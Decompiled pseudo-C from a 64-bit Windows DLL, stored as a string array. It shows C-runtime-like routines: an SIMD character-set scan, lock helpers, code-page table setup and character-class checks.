    "__int64 __fastcall sub_1800205D0(char *a1, unsigned __int8 *a2)",
    "{",
    "  __int64 v2; // r11",
    "  const __m128i *v3; // rsi",
    "  char *v5; // r8",
    "  __m128i v6; // xmm1",
    "  __int64 v7; // rdx",
    "  unsigned int v8; // eax",
    "  unsigned int v9; // r9d",
    "  BOOL v10; // ebx",
    "  __m128i v11; // xmm2",
    "  unsigned int v12; // eax",
    "  unsigned int v14; // ecx",
    "  char i; // al",
    "  __m128i v16; // xmm0",
    "  __m128i v17; // xmm0",
    "",
    "  v2 = (unsigned __int8)a2 & 0xF;",
    "  v3 = (const __m128i *)&a2[-v2];",
    "  v5 = a1;",
    "  v6 = _mm_loadu_si128((const __m128i *)&a2[-v2]);",
    "  switch ( (unsigned __int8)a2 & 0xF )",
    "  {",
    "    case 1:",
    "      v6 = _mm_srli_si128(v6, 1);",
    "      break;",
    "    case 2:",
    "      v6 = _mm_srli_si128(v6, 2);",
    "      break;",
    "    case 3:",
    "      v6 = _mm_srli_si128(v6, 3);",
    "      break;",
    "    case 4:",
    "      v6 = _mm_srli_si128(v6, 4);",
    "      break;",
    "    case 5:",
    "      v6 = _mm_srli_si128(v6, 5);",
    "      break;",
    "    case 6:",
    "      v6 = _mm_srli_si128(v6, 6);",
    "      break;",
    "    case 7:",
    "      v6 = _mm_srli_si128(v6, 7);",
    "      break;",
    "    case 8:",
    "      v6 = _mm_srli_si128(v6, 8);",
    "      break;",
    "    case 9:",
    "      v6 = _mm_srli_si128(v6, 9);",
    "      break;",
    "    case 0xA:",
    "      v6 = _mm_srli_si128(v6, 10);",
    "      break;",
    "    case 0xB:",
    "      v6 = _mm_srli_si128(v6, 11);",
    "      break;",
    "    case 0xC:",
    "      v6 = _mm_srli_si128(v6, 12);",
    "      break;",
    "    case 0xD:",
    "      v6 = _mm_srli_si128(v6, 13);",
    "      break;",
    "    case 0xE:",
    "      v6 = _mm_srli_si128(v6, 14);",
    "      break;",
    "    case 0xF:",
    "      v6 = _mm_srli_si128(v6, 15);",
    "      break;",
    "    default:",
    "      break;",
    "  }",
    "  v7 = 0;",
    "  v8 = _mm_movemask_epi8(_mm_cmpeq_epi8((__m128i)0LL, v6));",
    "  if ( v8 )",
    "  {",
    "    _BitScanForward(&v9, v8);",
    "    if ( v2 )",
    "      v10 = v9 < (unsigned __int64)(16 - v2);",
    "    else",
    "      v10 = 1;",
    "    if ( 15 - v9 <= 0xF )",
    "    {",
    "      switch ( 15 - v9 )",
    "      {",
    "        case 0u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 1), 1);",
    "          break;",
    "        case 1u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 2), 2);",
    "          break;",
    "        case 2u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 3), 3);",
    "          break;",
    "        case 3u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 4), 4);",
    "          break;",
    "        case 4u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 5), 5);",
    "          break;",
    "        case 5u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 6), 6);",
    "          break;",
    "        case 6u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 7), 7);",
    "          break;",
    "        case 7u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 8), 8);",
    "          break;",
    "        case 8u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 9), 9);",
    "          break;",
    "        case 9u:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 10), 10);",
    "          break;",
    "        case 0xAu:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 11), 11);",
    "          break;",
    "        case 0xBu:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 12), 12);",
    "          break;",
    "        case 0xCu:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 13), 13);",
    "          break;",
    "        case 0xDu:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 14), 14);",
    "          break;",
    "        case 0xEu:",
    "          v6 = _mm_srli_si128(_mm_slli_si128(v6, 15), 15);",
    "          break;",
    "        case 0xFu:",
    "          v6 = 0;",
    "          break;",
    "      }",
    "    }",
    "    if ( !v10 )",
    "      goto LABEL_40;",
    "  }",
    "  else",
    "  {",
    "    if ( v2 )",
    "    {",
    "LABEL_40:",
    "      v11 = _mm_loadu_si128(v3 + 1);",
    "      v12 = _mm_movemask_epi8(_mm_cmpeq_epi8(v11, (__m128i)0LL));",
    "      if ( !v12 )",
    "        return sub_180020530(v5, a2);",
    "      _BitScanForward(&v14, v12);",
    "      if ( (unsigned __int64)v14 - v2 < 0xFFFFFFFFFFFFFFF0uLL && v14 - v2 != 0 )",
    "        return sub_180020530(v5, a2);",
    "      switch ( 15 - v14 )",
    "      {",
    "        case 0u:",
    "          v11 = _mm_slli_si128(v11, 1);",
    "          break;",
    "        case 1u:",
    "          v11 = _mm_slli_si128(v11, 2);",
    "          break;",
    "        case 2u:",
    "          v11 = _mm_slli_si128(v11, 3);",
    "          break;",
    "        case 3u:",
    "          v11 = _mm_slli_si128(v11, 4);",
    "          break;",
    "        case 4u:",
    "          v11 = _mm_slli_si128(v11, 5);",
    "          break;",
    "        case 5u:",
    "          v11 = _mm_slli_si128(v11, 6);",
    "          break;",
    "        case 6u:",
    "          v11 = _mm_slli_si128(v11, 7);",
    "          break;",
    "        case 7u:",
    "          v11 = _mm_slli_si128(v11, 8);",
    "          break;",
    "        case 8u:",
    "          v11 = _mm_slli_si128(v11, 9);",
    "          break;",
    "        case 9u:",
    "          v11 = _mm_slli_si128(v11, 10);",
    "          break;",
    "        case 0xAu:",
    "          v11 = _mm_slli_si128(v11, 11);",
    "          break;",
    "        case 0xBu:",
    "          v11 = _mm_slli_si128(v11, 12);",
    "          break;",
    "        case 0xCu:",
    "          v11 = _mm_slli_si128(v11, 13);",
    "          break;",
    "        case 0xDu:",
    "          v11 = _mm_slli_si128(v11, 14);",
    "          break;",
    "        case 0xEu:",
    "          v11 = _mm_slli_si128(v11, 15);",
    "          break;",
    "        case 0xFu:",
    "          v11 = 0;",
    "          break;",
    "        default:",
    "          break;",
    "      }",
    "      v6 = _mm_or_si128(v6, v11);",
    "      goto LABEL_64;",
    "    }",
    "    if ( v3->m128i_i8[1] )",
    "      return sub_180020530(a1, a2);",
    "  }",
    "LABEL_64:",
    "  for ( i = *v5; i; ++v7 )",
    "  {",
    "    v16 = _mm_cvtsi32_si128(i);",
    "    v17 = _mm_unpacklo_epi8(v16, v16);",
    "    if ( _mm_movemask_epi8(_mm_cmpeq_epi8(_mm_shuffle_epi32(_mm_unpacklo_epi8(v17, v17), 0), v6)) )",
    "      break;",
    "    i = *++v5;",
    "  }",
    "  return v7;",
    "}",
    "",
    "",
    "char sub_1800209A0()",
    "{",
    "  __int64 v0; // rbx",
    "",
    "  v0 = 0;",
    "  while ( (unsigned int)sub_180023878((LPCRITICAL_SECTION)&unk_18004D300 + v0, (PCONTEXT)0xFA0) )",
    "  {",
    "    ++dword_18004D530;",
    "    v0 = (unsigned int)(v0 + 1);",
    "    if ( (unsigned int)v0 >= 0xE )",
    "      return 1;",
    "  }",
    "  sub_180020A04(0);",
    "  return 0;",
    "}",
    "",
    "",
    "void __fastcall sub_1800209E8(int a1)",
    "{",
    "  EnterCriticalSection((LPCRITICAL_SECTION)&unk_18004D300 + a1);",
    "}",
    "",
    "",
    "char sub_180020A04()",
    "{",
    "  int v0; // ebx",
    "",
    "  v0 = dword_18004D530;",
    "  while ( v0 )",
    "  {",
    "    DeleteCriticalSection((LPCRITICAL_SECTION)&unk_18004D300 + (unsigned int)--v0);",
    "    --dword_18004D530;",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "void __fastcall sub_180020A3C(int a1)",
    "{",
    "  LeaveCriticalSection((LPCRITICAL_SECTION)&unk_18004D300 + a1);",
    "}",
    "",
    "",
    "void sub_180020A58()",
    "{",
    "  sub_180023B4C();",
    "  EnterCriticalSection((LPCRITICAL_SECTION)&unk_18004D3A0);",
    "}",
    "",
    "",
    "// attributes: thunk",
    "__int64 __fastcall sub_180020A84(__int64 a1)",
    "{",
    "}__int64 __fastcall sub_180020A8C(__int64 a1, int *a2, __int64 a3, int *a4)",
    "{",
    "  __int64 v6; // rdi",
    "",
    "  sub_1800209E8(*a2);",
    "  v6 = sub_180020ACC(a3);",
    "  sub_180020A3C(*a4);",
    "  return v6;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180020ACC(unsigned int **a1)",
    "{",
    "  __int64 v2; // rsi",
    "  unsigned int v3; // r14d",
    "  __int64 v4; // r14",
    "  int v5; // eax",
    "  __int64 v6; // rax",
    "  XSAVE_FORMAT *v7; // rcx",
    "  XSAVE_FORMAT *v8; // rbx",
    "  __int64 result; // rax",
    "  int v10; // eax",
    "  __int64 v11; // r13",
    "  __int64 v12; // rcx",
    "  int v13; // eax",
    "  __int64 v14; // rax",
    "  XSAVE_FORMAT *v15; // rsi",
    "  __int64 v16; // r15",
    "  int v17; // eax",
    "  __int64 v18; // rbx",
    "  volatile signed __int32 *v19; // rdx",
    "  volatile signed __int32 *v20; // rdx",
    "  _QWORD v21[2]; // [rsp+30h] [rbp-10h] BYREF",
    "  __int64 v22; // [rsp+70h] [rbp+30h] BYREF",
    "  __int64 v23; // [rsp+78h] [rbp+38h] BYREF",
    "",
    "  v2 = *(_QWORD *)a1[1];",
    "  v3 = **a1;",
    "  if ( v2 )",
    "  {",
    "    v5 = sub_18002AC24((unsigned int)&v23, 0, 0, *(_QWORD *)a1[1], 0x7FFFFFFF);",
    "    if ( v5 != 22 && v5 != 34 )",
    "    {",
    "      v6 = sub_1800232FC(v23, 2);",
    "      v7 = 0;",
    "      v8 = (XSAVE_FORMAT *)v6;",
    "      if ( !v6 )",
    "      {",
    "LABEL_6:",
    "        sub_180023374(v7);",
    "        return 0;",
    "      }",
    "      v10 = sub_18002AC24(0, v6, v23, v2, -1);",
    "      if ( !v10 )",
    "      {",
    "        v4 = sub_1800271B0(v3, v8);",
    "        sub_180023374(v8);",
    "        goto LABEL_13;",
    "      }",
    "      if ( v10 != 22 && v10 != 34 )",
    "      {",
    "        v7 = v8;",
    "        goto LABEL_6;",
    "      }",
    "    }",
    "    sub_18001A6B4();",
    "    __debugbreak();",
    "  }",
    "  v4 = sub_1800271B0(v3, 0);",
    "LABEL_13:",
    "  if ( !v4 )",
    "    return 0;",
    "  v11 = sub_1800262FC();",
    "  v21[0] = *(_QWORD *)(v11 + 144);",
    "  v12 = *(_QWORD *)(v11 + 136);",
    "  v22 = 0;",
    "  v21[1] = v12;",
    "  v13 = sub_18002B120((unsigned int)&v22, 0, 0, v4, 0, (__int64)v21);",
    "  if ( v13 )",
    "  {",
    "    if ( v13 != 22 && v13 != 34 )",
    "      return 0;",
    "LABEL_32:",
    "    sub_18001A6B4();",
    "    JUMPOUT(0x180020D65LL);",
    "  }",
    "  v14 = sub_180024B50(v22 + 4);",
    "  v15 = (XSAVE_FORMAT *)v14;",
    "  if ( !v14 )",
    "    return 0;",
    "  v16 = v14 + 4;",
    "  v17 = sub_18002B120(0, (int)v14 + 4, v22, v4, -1, (__int64)v21);",
    "  if ( v17 )",
    "  {",
    "    if ( v17 == 22 || v17 == 34 )",
    "      goto LABEL_32;",
    "    v7 = v15;",
    "    goto LABEL_6;",
    "  }",
    "  v18 = v21[0];",
    "  v19 = *(volatile signed __int32 **)(32LL * (int)**a1 + v21[0] + 48);",
    "  if ( v19 && _InterlockedExchangeAdd(v19, 0xFFFFFFFF) == 1 )",
    "  {",
    "    sub_180023374(*(XSAVE_FORMAT **)(32LL * (int)**a1 + v18 + 48));",
    "    *(_QWORD *)(32LL * (int)**a1 + v18 + 48) = 0;",
    "  }",
    "  if ( (*(_DWORD *)(v11 + 936) & dword_18004B5B0) == 0 )",
    "  {",
    "    v20 = *(volatile signed __int32 **)(32LL * (int)**a1 + v18 + 48);",
    "    if ( v20 )",
    "    {",
    "      if ( _InterlockedExchangeAdd(v20, 0xFFFFFFFF) == 1 )",
    "      {",
    "        sub_180023374(*(XSAVE_FORMAT **)(32LL * (int)**a1 + v18 + 48));",
    "        *(_QWORD *)(32LL * (int)**a1 + v18 + 48) = 0;",
    "      }",
    "    }",
    "  }",
    "  result = v16;",
    "  *(_DWORD *)&v15->ControlWord = *(_DWORD *)(v18 + 16);",
    "  *(_QWORD *)(32LL * (int)**a1 + v18 + 48) = v15;",
    "  *(_QWORD *)(32 * ((int)**a1 + 1LL) + v18) = v16;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180020D68(int a1, __int64 a2)",
    "{",
    "  int v3; // [rsp+20h] [rbp-20h] BYREF",
    "  _QWORD v4[3]; // [rsp+28h] [rbp-18h] BYREF",
    "  int v5; // [rsp+50h] [rbp+10h] BYREF",
    "  __int64 v6; // [rsp+58h] [rbp+18h] BYREF",
    "  char v7; // [rsp+60h] [rbp+20h] BYREF",
    "  int v8; // [rsp+68h] [rbp+28h] BYREF",
    "",
    "  v6 = a2;",
    "  v5 = a1;",
    "  sub_180023B4C();",
    "  v4[0] = &v5;",
    "  v4[1] = &v6;",
    "  v8 = 4;",
    "  v3 = 4;",
    "  return sub_180020A8C((__int64)&v7, &v3, (__int64)v4, &v8);",
    "}",
    "",
    "",
    "__int64 sub_180020DB4()",
    "{",
    "  __int64 v0; // rax",
    "  __int64 v2; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  v0 = sub_1800262FC();",
    "  v2 = *(_QWORD *)(v0 + 144);",
    "  sub_180024BB0(v0, &v2);",
    "  return *(_QWORD *)v2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180020DF0(int a1)",
    "{",
    "  __int64 v1; // rbx",
    "  unsigned int v2; // edi",
    "  __int64 v4; // rax",
    "  __int64 v5; // [rsp+38h] [rbp+10h] BYREF",
    "",
    "  v1 = a1;",
    "  v2 = a1 + 1;",
    "  if ( dword_18004DC98 )",
    "  {",
    "    v4 = sub_1800262FC();",
    "    v5 = *(_QWORD *)(v4 + 144);",
    "    sub_180024BB0(v4, &v5);",
    "    if ( v2 <= 0x100 )",
    "      return *(_WORD *)(*(_QWORD *)v5 + 2 * v1) & 2;",
    "    if ( *(int *)(v5 + 8) > 1 )",
    "      return sub_180027F48((unsigned int)v1);",
    "  }",
    "  else if ( v2 <= 0x100 )",
    "  {",
    "    return off_18004B340[a1] & 2;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180020EA0(int a1)",
    "{",
    "  __int64 v1; // rbx",
    "  unsigned int v2; // edi",
    "  __int64 v4; // rax",
    "  __int64 v5; // [rsp+38h] [rbp+10h] BYREF",
    "",
    "  v1 = a1;",
    "  v2 = a1 + 1;",
    "  if ( dword_18004DC98 )",
    "  {",
    "    v4 = sub_1800262FC();",
    "    v5 = *(_QWORD *)(v4 + 144);",
    "    sub_180024BB0(v4, &v5);",
    "    if ( v2 <= 0x100 )",
    "      return *(_WORD *)(*(_QWORD *)v5 + 2 * v1) & 8;",
    "    if ( *(int *)(v5 + 8) > 1 )",
    "      return sub_180027F48((unsigned int)v1);",
    "  }",
    "  else if ( v2 <= 0x100 )",
    "  {",
    "    return off_18004B340[a1] & 8;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180020F50(int a1)",
    "{",
    "  __int64 v1; // rbx",
    "  unsigned int v2; // edi",
    "  __int64 v4; // rax",
    "  __int64 v5; // [rsp+38h] [rbp+10h] BYREF",
    "",
    "  v1 = a1;",
    "  v2 = a1 + 1;",
    "  if ( dword_18004DC98 )",
    "  {",
    "    v4 = sub_1800262FC();",
    "    v5 = *(_QWORD *)(v4 + 144);",
    "    sub_180024BB0(v4, &v5);",
    "    if ( v2 <= 0x100 )",
    "      return *(_WORD *)(*(_QWORD *)v5 + 2 * v1) & 1;",
    "    if ( *(int *)(v5 + 8) > 1 )",
    "      return sub_180027F48((unsigned int)v1);",
    "  }",
    "  else if ( v2 <= 0x100 )",
    "  {",
    "    return off_18004B340[a1] & 1;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 sub_180020FF8()",
    "{",
    "  __int64 v0; // rax",
    "  __int64 v2; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  v0 = sub_1800262FC();",
    "  v2 = *(_QWORD *)(v0 + 144);",
    "  sub_180024BB0(v0, &v2);",
    "  return *(unsigned int *)(v2 + 12);",
    "}",
    "",
    "",
    "__int64 sub_180021028()",
    "{",
    "  __int64 v0; // rax",
    "  __int64 v2; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  v0 = sub_1800262FC();",
    "  v2 = *(_QWORD *)(v0 + 144);",
    "  sub_180024BB0(v0, &v2);",
    "  return v2 + 296;",
    "}",
    "",
    "",
    "__int64 sub_18002105C()",
    "{",
    "  __int64 v0; // rax",
    "  __int64 v2; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  v0 = sub_1800262FC();",
    "  v2 = *(_QWORD *)(v0 + 144);",
    "  sub_180024BB0(v0, &v2);",
    "  return *(unsigned int *)(v2 + 8);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18002108C(__int64 a1)",
    "{",
    "  __int64 v1; // r8",
    "  unsigned int v2; // ebx",
    "  __int64 v4; // r13",
    "  __int64 v5; // r14",
    "  __int64 v6; // rbp",
    "  XSAVE_FORMAT *v7; // r12",
    "  UINT *v8; // r15",
    "  XSAVE_FORMAT *v9; // rcx",
    "  int i; // eax",
    "  __int64 v11; // rdx",
    "  unsigned __int8 *j; // rcx",
    "  int v13; // edx",
    "  __int64 v14; // rax",
    "  _BYTE *v15; // rdx",
    "  __int16 *v16; // r9",
    "  int k; // ecx",
    "  __int16 v18; // ax",
    "  unsigned __int8 *m; // rdx",
    "  int v20; // ecx",
    "  __int128 v21; // xmm1",
    "  __int64 v22; // rcx",
    "  __int64 v23; // rax",
    "  __int128 v24; // xmm1",
    "  __int128 v25; // xmm1",
    "  __int128 v26; // xmm1",
    "  __int64 v27; // r13",
    "  __int128 v28; // xmm0",
    "  __int128 v29; // xmm1",
    "  __int128 v30; // xmm0",
    "  __int128 v31; // xmm1",
    "  __int128 v32; // xmm0",
    "  __int128 v33; // xmm1",
    "  __int128 v34; // xmm0",
    "  __int128 v35; // xmm1",
    "  __int128 v36; // xmm0",
    "  __int128 v37; // xmm1",
    "  __int128 v38; // xmm0",
    "  __int128 v39; // xmm1",
    "  __int128 v40; // xmm0",
    "  __int128 v41; // xmm1",
    "  __int128 v42; // xmm0",
    "  __int128 v43; // xmm1",
    "  __int128 v44; // xmm0",
    "  __int128 v45; // xmm1",
    "  __int128 v46; // xmm0",
    "  volatile signed __int32 *v47; // rcx",
    "  __int64 result; // rax",
    "  volatile signed __int32 *v49; // rax",
    "  unsigned int v50; // [rsp+50h] [rbp-78h]",
    "  XSAVE_FORMAT *lpMem; // [rsp+58h] [rbp-70h]",
    "  __int64 v52; // [rsp+60h] [rbp-68h]",
    "  __int64 v53; // [rsp+68h] [rbp-60h]",
    "  _QWORD v54[2]; // [rsp+70h] [rbp-58h] BYREF",
    "  _BYTE CPInfo[24]; // [rsp+80h] [rbp-48h] BYREF",
    "",
    "  v1 = *(_QWORD *)(a1 + 312);",
    "  v2 = 0;",
    "  v54[0] = a1;",
    "  v54[1] = 0;",
    "  v4 = 0;",
    "  v5 = 0;",
    "  v6 = 0;",
    "  v7 = 0;",
    "  if ( v1 )",
    "  {",
    "    v8 = (UINT *)(a1 + 12);",
    "    lpMem = 0;",
    "    if ( !*(_DWORD *)(a1 + 12) && (unsigned int)sub_18002B354((unsigned int)v54, 0, v1, 4100, a1 + 12) )",
    "      goto LABEL_41;",
    "    lpMem = (XSAVE_FORMAT *)sub_1800232FC(1, 4);",
    "    sub_180023374(0);",
    "    v4 = sub_1800232FC(384, 2);",
    "    sub_180023374(0);",
    "    v5 = sub_1800232FC(384, 1);",
    "    sub_180023374(0);",
    "    v6 = sub_1800232FC(384, 1);",
    "    sub_180023374(0);",
    "    v7 = (XSAVE_FORMAT *)sub_1800232FC(257, 1);",
    "    sub_180023374(0);",
    "    if ( !lpMem )",
    "      goto LABEL_41;",
    "    if ( !v4 )",
    "      goto LABEL_41;",
    "    if ( !v7 )",
    "      goto LABEL_41;",
    "    if ( !v5 )",
    "      goto LABEL_41;",
    "    if ( !v6 )",
    "      goto LABEL_41;",
    "    v9 = v7;",
    "    for ( i = 0; i < 256; ++i )",
    "    {",
    "      LOBYTE(v9->ControlWord) = i;",
    "      v9 = (XSAVE_FORMAT *)((char *)v9 + 1);",
    "    }",
    "    if ( !GetCPInfo(*v8, (LPCPINFO)CPInfo) || *(_DWORD *)CPInfo > 5u )",
    "      goto LABEL_41;",
    "    v50 = *(unsigned __int16 *)CPInfo;",
    "    if ( *(unsigned __int16 *)CPInfo > 1u )",
    "    {",
    "      if ( *v8 == 65001 )",
    "      {",
    "        LOBYTE(v11) = 32;",
    "        sub_1800368A0(&v7->FloatRegisters[6], v11, 128);",
    "      }",
    "      else",
    "      {",
    "        for ( j = &CPInfo[6]; *j; j += 2 )",
    "        {",
    "          if ( !j[1] )",
    "            break;",
    "          v13 = *j;",
    "          if ( v13 <= (unsigned int)j[1] )",
    "          {",
    "            do",
    "            {",
    "              v14 = v13++;",
    "              *((_BYTE *)&v7->ControlWord + v14) = 32;",
    "            }",
    "            while ( v13 <= j[1] );",
    "          }",
    "        }",
    "      }",
    "    }",
    "    if ( (unsigned int)sub_18002B9E0(0, *(_QWORD *)(a1 + 312), 256, (int)v7 + 1, 255, v5 + 129, 255, *v8, 0)",
    "      && (unsigned int)sub_18002B9E0(0, *(_QWORD *)(a1 + 312), 512, (int)v7 + 1, 255, v6 + 129, 255, *v8, 0)",
    "      && (v52 = v4 + 256, (unsigned int)sub_18002B51C(0, 1, v7, 256, v4 + 256, *v8, 0)) )",
    "    {",
    "      *(_WORD *)(v4 + 254) = 0;",
    "      *(_BYTE *)(v5 + 127) = 0;",
    "      *(_BYTE *)(v6 + 127) = 0;",
    "      *(_BYTE *)(v5 + 128) = 0;",
    "      *(_BYTE *)(v6 + 128) = 0;",
    "      v53 = v4 + 254;",
    "      if ( v50 > 1 )",
    "      {",
    "        if ( *v8 == 65001 )",
    "        {",
    "          v15 = (_BYTE *)(v6 + 256);",
    "          v16 = (__int16 *)(v4 + 512);",
    "          for ( k = 128; k <= 255; ++k )",
    "          {",
    "            if ( (unsigned int)(k - 194) > 0x32 )",
    "              v18 = 0;",
    "            else",
    "              v18 = 0x8000;",
    "            *v16++ = v18;",
    "            v15[v5 - v6] = k;",
    "            *v15++ = k;",
    "          }",
    "        }",
    "        else",
    "        {",
    "          for ( m = &CPInfo[6]; *m; m += 2 )",
    "          {",
    "            if ( !m[1] )",
    "              break;",
    "            v20 = *m;",
    "            if ( v20 <= (unsigned int)m[1] )",
    "            {",
    "              do",
    "              {",
    "                *(_WORD *)(v4 + 2LL * v20 + 256) = 0x8000;",
    "                *(_BYTE *)(v20 + v5 + 128) = v20;",
    "                *(_BYTE *)(v20 + v6 + 128) = v20;",
    "                ++v20;",
    "              }",
    "              while ( v20 <= m[1] );",
    "            }",
    "          }",
    "        }",
    "      }",
    "      v21 = *(_OWORD *)(v4 + 528);",
    "      v22 = v4 + 640;",
    "      *(_OWORD *)v4 = *(_OWORD *)(v4 + 512);",
    "      v23 = *(_QWORD *)(v4 + 752);",
    "      *(_OWORD *)(v4 + 16) = v21;",
    "      v24 = *(_OWORD *)(v4 + 560);",
    "      *(_OWORD *)(v4 + 32) = *(_OWORD *)(v4 + 544);",
    "      *(_OWORD *)(v4 + 48) = v24;",
    "      v25 = *(_OWORD *)(v4 + 592);",
    "      *(_OWORD *)(v4 + 64) = *(_OWORD *)(v4 + 576);",
    "      *(_OWORD *)(v4 + 80) = v25;",
    "      v26 = *(_OWORD *)(v4 + 624);",
    "      *(_OWORD *)(v4 + 96) = *(_OWORD *)(v4 + 608);",
    "      v27 = v4 + 128;",
    "      v28 = *(_OWORD *)v22;",
    "      *(_OWORD *)(v27 - 16) = v26;",
    "      v29 = *(_OWORD *)(v22 + 16);",
    "      *(_OWORD *)v27 = v28;",
    "      v30 = *(_OWORD *)(v22 + 32);",
    "      *(_OWORD *)(v27 + 16) = v29;",
    "      v31 = *(_OWORD *)(v22 + 48);",
    "      *(_OWORD *)(v27 + 32) = v30;",
    "      v32 = *(_OWORD *)(v22 + 64);",
    "      *(_OWORD *)(v27 + 48) = v31;",
    "      v33 = *(_OWORD *)(v22 + 80);",
    "      *(_OWORD *)(v27 + 64) = v32;",
    "      v34 = *(_OWORD *)(v22 + 96);",
    "      *(_OWORD *)(v27 + 80) = v33;",
    "      *(_OWORD *)(v27 + 96) = v34;",
    "      *(_QWORD *)(v27 + 112) = v23;",
    "      *(_DWORD *)(v27 + 120) = *(_DWORD *)(v22 + 120);",
    "      *(_WORD *)(v27 + 124) = *(_WORD *)(v22 + 124);",
    "      LODWORD(v23) = *(_DWORD *)(v5 + 376);",
    "      v35 = *(_OWORD *)(v5 + 272);",
    "      *(_OWORD *)v5 = *(_OWORD *)(v5 + 256);",
    "      v36 = *(_OWORD *)(v5 + 288);",
    "      *(_OWORD *)(v5 + 16) = v35;",
    "      v37 = *(_OWORD *)(v5 + 304);",
    "      *(_OWORD *)(v5 + 32) = v36;",
    "      v38 = *(_OWORD *)(v5 + 320);",
    "      *(_OWORD *)(v5 + 48) = v37;",
    "      v39 = *(_OWORD *)(v5 + 336);",
    "      *(_OWORD *)(v5 + 64) = v38;",
    "      v40 = *(_OWORD *)(v5 + 352);",
    "      *(_OWORD *)(v5 + 80) = v39;",
    "      *(_QWORD *)&v39 = *(_QWORD *)(v5 + 368);",
    "      *(_OWORD *)(v5 + 96) = v40;",
    "      *(_QWORD *)(v5 + 112) = v39;",
    "      *(_DWORD *)(v5 + 120) = v23;",
    "      *(_WORD *)(v5 + 124) = *(_WORD *)(v5 + 380);",
    "      *(_BYTE *)(v5 + 126) = *(_BYTE *)(v5 + 382);",
    "      LODWORD(v23) = *(_DWORD *)(v6 + 376);",
    "      v41 = *(_OWORD *)(v6 + 272);",
    "      *(_OWORD *)v6 = *(_OWORD *)(v6 + 256);",
    "      v42 = *(_OWORD *)(v6 + 288);",
    "      *(_OWORD *)(v6 + 16) = v41;",
    "      v43 = *(_OWORD *)(v6 + 304);",
    "      *(_OWORD *)(v6 + 32) = v42;",
    "      v44 = *(_OWORD *)(v6 + 320);",
    "      *(_OWORD *)(v6 + 48) = v43;",
    "      v45 = *(_OWORD *)(v6 + 336);",
    "      *(_OWORD *)(v6 + 64) = v44;",
    "      v46 = *(_OWORD *)(v6 + 352);",
    "      *(_OWORD *)(v6 + 80) = v45;",
    "      *(_QWORD *)&v45 = *(_QWORD *)(v6 + 368);",
    "      *(_OWORD *)(v6 + 96) = v46;",
    "      *(_QWORD *)(v6 + 112) = v45;",
    "      *(_DWORD *)(v6 + 120) = v23;",
    "      *(_WORD *)(v6 + 124) = *(_WORD *)(v6 + 380);",
    "      *(_BYTE *)(v6 + 126) = *(_BYTE *)(v6 + 382);",
    "      v47 = *(volatile signed __int32 **)(a1 + 256);",
    "      if ( v47 )",
    "      {",
    "        if ( _InterlockedExchangeAdd(v47, 0xFFFFFFFF) == 1 )",
    "        {",
    "          sub_180023374((XSAVE_FORMAT *)(*(_QWORD *)(a1 + 264) - 254LL));",
    "          sub_180023374((XSAVE_FORMAT *)(*(_QWORD *)(a1 + 272) - 128LL));",
    "          sub_180023374((XSAVE_FORMAT *)(*(_QWORD *)(a1 + 280) - 128LL));",
    "          sub_180023374(*(XSAVE_FORMAT **)(a1 + 256));",
    "        }",
    "      }",
    "      *(_DWORD *)&lpMem->ControlWord = 1;",
    "      *(_QWORD *)(a1 + 256) = lpMem;",
    "      *(_QWORD *)a1 = v52;",
    "      *(_QWORD *)(a1 + 264) = v53;",
    "      *(_QWORD *)(a1 + 272) = v5 + 128;",
    "      *(_QWORD *)(a1 + 280) = v6 + 128;",
    "      *(_DWORD *)(a1 + 8) = v50;",
    "    }",
    "    else",
    "    {",
    "LABEL_41:",
    "      sub_180023374(lpMem);",
    "      sub_180023374((XSAVE_FORMAT *)v4);",
    "      sub_180023374((XSAVE_FORMAT *)v5);",
    "      sub_180023374((XSAVE_FORMAT *)v6);",
    "      v2 = 1;",
    "    }",
    "    sub_180023374(v7);",
    "    return v2;",
    "  }",
    "  else",
    "  {",
    "    v49 = *(volatile signed __int32 **)(a1 + 256);",
    "    if ( v49 )",
    "      _InterlockedDecrement(v49);",
    "    *(_QWORD *)(a1 + 256) = 0;",
    "    *(_QWORD *)a1 = asc_18003CC20;",
    "    *(_QWORD *)(a1 + 264) = 0;",
    "    *(_QWORD *)(a1 + 272) = &unk_18003CEA0;",
    "    *(_QWORD *)(a1 + 280) = &unk_18003D020;",
    "    result = 0;",
    "    *(_DWORD *)(a1 + 8) = 1;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800216F0(__int64 a1)",
    "{",
    "  __int64 v2; // rbx",
    "  __int64 v3; // rbx",
    "  __int64 v4; // rax",
    "  __int64 v5; // rsi",
    "",
    "  if ( !a1 )",
    "    return 0;",
    "  v2 = -1;",
    "  do",
    "    ++v2;",
    "  while ( *(_WORD *)(a1 + 2 * v2) );",
    "  v3 = v2 + 1;",
    "  v4 = sub_180020A84(2 * v3);",
    "  v5 = v4;",
    "  if ( !v4 )",
    "    return 0;",
    "  if ( (unsigned int)sub_18002BA78(v4, v3, a1) )",
    "  {",
    "    sub_18001A6B4();",
    "    JUMPOUT(0x180021771LL);",
    "  }",
    "  return v5;",
    "}",
    "",
